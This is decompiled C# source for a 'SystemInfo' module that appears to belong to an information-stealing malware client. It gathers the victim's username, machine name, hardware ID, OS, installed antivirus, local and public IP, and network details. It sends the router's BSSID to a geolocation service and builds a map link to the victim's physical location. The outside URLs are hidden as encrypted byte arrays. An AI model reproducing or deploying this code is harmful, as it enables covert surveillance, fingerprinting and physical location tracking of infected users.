using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Client.Modules.Manager;

internal sealed class SystemInfo
{
	public static string username = Environment.UserName;

	public static string compname = Environment.MachineName;

	public static string culture = CultureInfo.CurrentCulture.ToString();

	public static string datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

	[DllImport("iphlpapi.dll", ExactSpelling = true)]
	private static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

	public static string ScreenMetrics()
	{
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		int width = bounds.Width;
		return string.Concat(str2: bounds.Height.ToString(), str0: width.ToString(), str1: "x");
	}

	public static string GetBattery()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			BatteryChargeStatus batteryChargeStatus = SystemInformation.get_PowerStatus().get_BatteryChargeStatus();
			string text = ((object)(BatteryChargeStatus)(ref batteryChargeStatus)).ToString();
			string text2 = SystemInformation.get_PowerStatus().get_BatteryLifePercent().ToString()
				.Split(new char[1] { ',' })[^1];
			return text + " (" + text2 + "%)";
		}
		catch
		{
		}
		return "Unknown";
	}

	private static string GetWindowsVersionName()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		string text = "Unknown System";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						text = Convert.ToString(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name"));
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				text = text.Split(new char[1] { '|' })[0];
				int length = text.Split(new char[1] { ' ' })[0].Length;
				text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
				return text;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return text;
		}
	}

	private static string GetBitVersion()
	{
		try
		{
			if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
			{
				return "(32 Bit)";
			}
			return "(64 Bit)";
		}
		catch
		{
		}
		return "(Unknown)";
	}

	public static string GetSystemVersion()
	{
		return GetWindowsVersionName() + " " + GetBitVersion();
	}

	public static string GetHardwareID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("ProcessorId").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetDefaultGateway()
	{
		try
		{
			return (from g in (from n in NetworkInterface.GetAllNetworkInterfaces()
					where n.OperationalStatus == OperationalStatus.Up
					where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
					select n).SelectMany((NetworkInterface n) => n.GetIPProperties()?.GatewayAddresses)
				select g?.Address into a
				where a != null
				select a).FirstOrDefault()!.ToString();
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetAntivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						list.Add(current.get_Item("displayName").ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "Not installed";
				}
				return string.Join(", ", list.ToArray()) + ".";
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return "N/A";
	}

	public static string GetLocalIP()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
		}
		catch
		{
		}
		return "No network adapters with an IPv4 address in the system!";
	}

	public static string GetPublicIP()
	{
		try
		{
			return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[32]
			{
				172, 132, 62, 84, 188, 245, 252, 173, 117, 82,
				97, 91, 237, 238, 214, 39, 28, 15, 241, 23,
				15, 251, 204, 131, 247, 237, 166, 92, 82, 85,
				22, 172
			})).Replace("\n", "");
		}
		catch
		{
		}
		return "Request failed";
	}

	private static string GetBSSID()
	{
		byte[] array = new byte[6];
		uint physicalAddrLen = (uint)array.Length;
		try
		{
			if (SendARP(BitConverter.ToInt32(IPAddress.Parse(GetDefaultGateway()).GetAddressBytes(), 0), 0, array, ref physicalAddrLen) != 0)
			{
				return "unknown";
			}
			string[] array2 = new string[physicalAddrLen];
			for (int i = 0; i < physicalAddrLen; i++)
			{
				array2[i] = array[i].ToString("x2");
			}
			return string.Join(":", array2);
		}
		catch
		{
		}
		return "Failed";
	}

	public static string GetLocation()
	{
		string bSSID = GetBSSID();
		string text = "Unknown";
		string text2 = "Unknown";
		string text3 = "Unknown";
		string text4;
		try
		{
			using WebClient webClient = new WebClient();
			text4 = webClient.DownloadString(StringsCrypt.Decrypt(new byte[64]
			{
				91, 185, 159, 48, 60, 79, 139, 159, 124, 37,
				212, 232, 253, 2, 176, 189, 141, 243, 199, 107,
				13, 252, 71, 66, 122, 29, 213, 176, 205, 11,
				172, 67, 107, 43, 94, 178, 129, 142, 99, 210,
				172, 1, 13, 123, 158, 81, 183, 66, 255, 162,
				185, 157, 75, 7, 48, 125, 76, 21, 246, 190,
				35, 164, 108, 141
			}) + bSSID);
		}
		catch
		{
			return "BSSID: " + bSSID;
		}
		if (!text4.Contains("{\"result\":200"))
		{
			return "BSSID: " + bSSID;
		}
		int num = 0;
		string[] array = text4.Split(new char[1] { ' ' });
		string[] array2 = array;
		foreach (string obj2 in array2)
		{
			num++;
			if (obj2.Contains("\"lat\":"))
			{
				text = array[num].Replace(",", "");
			}
			if (obj2.Contains("\"lon\":"))
			{
				text2 = array[num].Replace(",", "");
			}
			if (obj2.Contains("\"range\":"))
			{
				text3 = array[num].Replace(",", "");
			}
		}
		string text5 = "BSSID: " + bSSID + "\nLatitude: " + text + "\nLongitude: " + text2 + "\nRange: " + text3;
		if (text != "Unknown" && text2 != "Unknown")
		{
			text5 = text5 + "\n[Open google maps](" + StringsCrypt.Decrypt(new byte[48]
			{
				206, 105, 162, 71, 154, 101, 143, 133, 216, 233,
				4, 78, 251, 231, 127, 197, 50, 50, 5, 167,
				22, 30, 67, 50, 30, 134, 116, 165, 251, 47,
				202, 115, 111, 224, 166, 249, 5, 156, 140, 131,
				223, 55, 212, 39, 236, 254, 69, 45
			}) + text + " " + text2 + ")";
		}
		return text5;
	}

	public static string GetCPUName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetGPUName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetRamAmount()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						num = (int)(Convert.ToDouble(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("TotalPhysicalMemory")) / 1048576.0);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return num + "MB";
		}
		catch
		{
		}
		return "-1";
	}
}
